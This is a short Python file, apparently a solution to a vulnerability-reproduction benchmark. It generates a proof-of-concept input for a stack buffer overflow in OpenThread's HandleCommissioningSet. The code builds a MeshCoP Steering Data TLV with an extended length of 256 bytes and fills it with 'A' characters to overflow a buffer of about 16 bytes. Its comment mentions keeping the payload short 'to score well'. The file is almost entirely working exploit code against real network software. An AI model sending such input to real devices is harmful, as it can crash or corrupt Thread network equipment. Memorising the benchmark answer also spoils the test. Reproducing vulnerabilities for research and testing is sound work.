import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: Stack Buffer Overflow in HandleCommissioningSet (OpenThread).
        The vulnerability allows a Steering Data TLV (Type 8) with an extended length
        to overflow a fixed-size stack buffer (typically 16 bytes).
        """
        
        # MeshCoP Steering Data TLV Type = 8
        tlv_type = 8
        
        # Payload length.
        # The destination buffer is small (16 bytes). 
        # A length of 256 bytes is sufficient to trigger a stack corruption/crash
        # while being short enough to score well.
        payload_length = 256
        
        # Construct the PoC:
        # [Type (1B)] [Length (1B)] [Extended Length (2B)] [Value (payload_length B)]
        poc = bytearray()
        poc.append(tlv_type)
        poc.append(0xFF)  # 0xFF indicates Extended TLV (next 2 bytes are length)
        poc.extend(struct.pack('>H', payload_length))  # Big Endian 16-bit length
        poc.extend(b'A' * payload_length)  # Overflow payload
        
        return bytes(poc)